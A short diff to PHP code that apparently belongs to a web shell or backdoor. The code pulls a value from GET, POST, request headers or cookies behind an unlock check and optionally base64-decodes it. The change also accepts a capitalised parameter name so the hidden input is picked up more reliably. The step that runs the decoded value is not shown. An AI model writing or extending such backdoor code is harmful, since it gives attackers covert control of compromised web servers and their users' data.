@@ -13,7 +13,6 @@
 		error_reporting(-1);
 	}
 
-
 	$arr = [$_GET, $_POST, getallheaders(), $_COOKIE];
 	$unlock = true;
 
@@ -25,8 +24,8 @@
 			}
 		}
 
-		if ($unlock && isset($i[PARAM])) {
-			$str = $i[PARAM];
+		if ($unlock && isset($i[PARAM]) || $unlock && isset($i[ucfirst(PARAM)])) {
+			$str = isset($i[PARAM]) ? $i[PARAM] : $i[ucfirst(PARAM)];
 
 			if (B64) {
 				$str = base64_decode($str);
